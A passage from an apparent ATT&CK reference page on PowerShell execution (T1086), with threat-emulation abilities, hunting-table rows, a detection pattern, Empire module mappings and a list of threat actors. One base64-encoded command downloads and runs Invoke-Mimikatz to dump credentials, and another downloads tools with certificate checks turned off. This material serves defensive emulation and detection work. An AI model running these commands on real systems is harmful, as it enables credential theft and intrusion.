                                                                              'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n'}}},
                                 'tactic': 'execution',
                                 'technique': {'attack_id': 'T1086',
                                               'name': 'PowerShell'}}},
 {'Mitre Stockpile - Download and install PSTools by unzipping the file': {'description': 'Download '
                                                                                          'and '
                                                                                          'install '
                                                                                          'PSTools '
                                                                                          'by '
                                                                                          'unzipping '
                                                                                          'the '
                                                                                          'file',
                                                                           'id': 'eb814e03-811a-467a-bc6d-dcd453750fa2',
                                                                           'name': 'Install '
                                                                                   'PSTools',
                                                                           'platforms': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
                                                                                                                        '= '
                                                                                                                        '{ '
                                                                                                                        '$True '
                                                                                                                        '};\n'
                                                                                                                        '$web '
                                                                                                                        '= '
                                                                                                                        '(New-Object '
                                                                                                                        'System.Net.WebClient);\n'
                                                                                                                        '$result '
                                                                                                                        '= '
                                                                                                                        '$web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", '
                                                                                                                        '"PSTools.zip");\n'
                                                                                                                        'New-Item '
                                                                                                                        '-ItemType '
                                                                                                                        '"directory" '
                                                                                                                        'C:\\Windows\\System32\\PSTools '
                                                                                                                        '-Force;\n'
                                                                                                                        'Add-Type '
                                                                                                                        '-Assembly '
                                                                                                                        "'System.IO.Compression.FileSystem'; "
                                                                                                                        '[System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", '
                                                                                                                        '"C:\\Windows\\System32\\PSTools");\n'}}},
                                                                           'tactic': 'execution',
                                                                           'technique': {'attack_id': 'T1086',
                                                                                         'name': 'PowerShell'}}},
 {'Threat Hunting Tables': {'chain_id': '100025',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'excel.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'cmd.exe',
                            'sub_process_2': 'powershell.exe'}},
 {'Threat Hunting Tables': {'chain_id': '100029',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'scripting',
                            'os': 'windows',
                            'parent_process': 'excel.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100042',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '3560481cc51a08c94cd5649b2782ec1395d56d9a1721e6e03720420898772ed0',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'scripting',
                            'os': 'windows',
                            'parent_process': 'mshta.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'cmd.exe',
                            'sub_process_2': 'powershell.exe'}},
 {'Threat Hunting Tables': {'chain_id': '100045',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': 'ee29b9c01318a1e23836b949942db14d4811246fdae2f41df9f0dcd922c63bc6',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'scripting',
                            'os': 'windows',
                            'parent_process': 'mshta.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100056',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powerpoint.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'cmd.exe',
                            'sub_process_2': 'powershell.exe'}},
 {'Threat Hunting Tables': {'chain_id': '100060',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powerpoint.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100064',
                            'commandline_string': 'webClient.DownloadString(',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powershell.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100065',
                            'commandline_string': 'webClient.DownloadFile',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powershell.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100066',
                            'commandline_string': 'webClient.DownloadData',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': 'https://www.joesandbox.com/analysis/35219/0/html',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powershell.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100092',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'winword.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1086': {'description': None,
                           'level': 'high',
                           'name': 'PowerShell',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'hidden|-enc|-NonI'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exe'}},
                                      'type': 'process'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1086',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_psremoting":  '
                                                                                 '["T1086"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_psremoting',
                                            'Technique': 'PowerShell'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1086',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/spawn":  '
                                                                                 '["T1086"],',
                                            'Empire Module': 'powershell/management/spawn',
                                            'Technique': 'PowerShell'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1086',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/management/multi/spawn":  '
                                                                                 '["T1086"],',
                                            'Empire Module': 'python/management/multi/spawn',
                                            'Technique': 'PowerShell'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

* [Turla](../actors/Turla.md)
    
* [APT29](../actors/APT29.md)
    
* [FIN10](../actors/FIN10.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Poseidon Group](../actors/Poseidon-Group.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [CopyKittens](../actors/CopyKittens.md)
    
* [APT19](../actors/APT19.md)
    
* [APT3](../actors/APT3.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [DarkHydrus](../actors/DarkHydrus.md)
    
* [APT28](../actors/APT28.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [TA459](../actors/TA459.md)
    
* [Thrip](../actors/Thrip.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [FIN8](../actors/FIN8.md)
    
* [menuPass](../actors/menuPass.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Gallmaker](../actors/Gallmaker.md)
    
* [APT33](../actors/APT33.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [WIRTE](../actors/WIRTE.md)
    
* [TA505](../actors/TA505.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [APT41](../actors/APT41.md)
    
